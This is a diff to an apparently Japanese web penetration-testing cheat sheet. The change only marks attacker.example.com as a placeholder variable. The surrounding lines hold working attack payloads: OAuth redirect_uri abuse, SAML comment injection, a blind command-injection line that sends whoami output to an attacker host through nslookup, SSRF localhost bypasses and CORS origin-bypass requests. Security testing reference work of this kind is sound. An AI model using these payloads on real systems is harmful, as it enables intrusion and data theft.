@@ -321,7 +321,7 @@ jwt_tool eyJhbGci... -I -hc kid -hv "../../dev/null"</code></pre></div>
 GET /authorize?client_id=xxx&amp;redirect_uri=https://<span class="v" data-var="ATTACKER">attacker.example.com</span>&amp;response_type=code&amp;scope=openid HTTP/1.1
 
 <span class="c"># redirect_uri の path traversal / サブドメイン許容の悪用</span>
-redirect_uri=https://target.example.com.attacker.example.com
+redirect_uri=https://target.example.com.<span class="v" data-var="ATTACKER">attacker.example.com</span>
 redirect_uri=https://<span class="v" data-var="TARGET">target.example.com</span>/callback/../redirect?url=attacker
 
 <span class="c"># state パラメータ欠如 → CSRF (アカウント連携の乗っ取り)</span>
@@ -333,7 +333,7 @@ echo "SAMLResponse..." | base64 -d | xmllint --format -
 
 <span class="c"># XML Signature Wrapping (XSW) — 署名済み要素の外に改竄要素を注入</span>
 <span class="c"># signature exclusion — Signature 要素ごと削除して検証回避</span>
-<span class="c"># comment injection — user@example.com<!---->.attacker.example.com で NameID を分断</span></code></pre></div>
+<span class="c"># comment injection — user@example.com<!---->.<span class="v" data-var="ATTACKER">attacker.example.com</span> で NameID を分断</span></code></pre></div>
 
       <div class="note"><span class="lbl">Burp workflow</span>
         認証系は Burp が主戦場。JWT は <b>JWT Editor</b> 拡張で alg 改竄・鍵注入をリアルタイムに。SAML は <b>SAML Raider</b> で XSW / signature exclusion を GUI 操作。OAuth の redirect_uri テストは Repeater で response_type / redirect_uri を差し替え、Intruder でパラメータ pollution を総当たり。ログインブルートフォースは Intruder (Sniper / Cluster bomb) だが、無料版はレート制限があるため CLI ツール併用が現実的。
@@ -531,7 +531,7 @@ $(id)
 
 <span class="c"># OOB / blind (時間 / DNS)</span>
 ; sleep 10
-&amp; nslookup $(whoami).attacker.example.com
+&amp; nslookup $(whoami).<span class="v" data-var="ATTACKER">attacker.example.com</span>
 
 <span class="c"># フィルタ回避</span>
 ;i''d
@@ -841,7 +841,7 @@ http://127.0.0.1:8080/admin
 http://127.1/
 http://0177.0.0.1/          <span class="c"># 8 進</span>
 http://2130706433/          <span class="c"># 10 進</span>
-http://localhost.attacker.example.com/    <span class="c"># DNS rebinding</span>
+http://localhost.<span class="v" data-var="ATTACKER">attacker.example.com</span>/    <span class="c"># DNS rebinding</span>
 http://[::1]/               <span class="c"># IPv6</span></code></pre></div>
 
       <div class="note"><span class="lbl">クラウドメタデータの差異</span>
@@ -1043,7 +1043,7 @@ curl -s -I https://<span class="v" data-var="TARGET">target.example.com</span>/a
 
 <span class="c"># null origin / サブドメイン / 前方一致バイパスの検証</span>
 curl -s -I https://<span class="v" data-var="TARGET">target.example.com</span>/api/data -H "Origin: null"
-curl -s -I https://<span class="v" data-var="TARGET">target.example.com</span>/api/data -H "Origin: https://target.example.com.attacker.example.com"</code></pre></div>
+curl -s -I https://<span class="v" data-var="TARGET">target.example.com</span>/api/data -H "Origin: https://target.example.com.<span class="v" data-var="ATTACKER">attacker.example.com</span>"</code></pre></div>
 
       <div class="note"><span class="lbl">Burp workflow</span>
         XSS は Repeater でコンテキスト (HTML body / 属性 / JS / URL) ごとに payload を試し、<b>DOM Invader</b> (Burp 内蔵ブラウザ) で DOM XSS の source→sink を自動追跡。反射 XSS は Intruder で XSS payload リストを流し、レスポンスに payload がエスケープされず出現するか判定。CORS は <b>passive scan</b> が Origin 反射を検出。CSRF PoC は Engagement tools → Generate CSRF PoC で自動生成できる。
